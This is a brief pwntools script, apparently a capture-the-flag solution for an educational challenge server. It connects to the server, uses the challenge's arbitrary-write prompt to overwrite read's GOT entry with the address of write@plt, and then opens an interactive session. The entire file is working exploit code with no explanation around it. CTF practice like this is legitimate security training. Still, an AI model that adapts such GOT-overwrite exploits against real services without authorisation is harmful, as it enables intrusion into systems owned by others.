#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = remote('edu-ctf.zoolab.org', 30203)

read_got = 0x404038
write_plt = 0x4010c0

r.sendlineafter('Overwrite addr: ', str(read_got))
r.sendafter('Overwrite 8 bytes value: ', p64(write_plt))

r.interactive()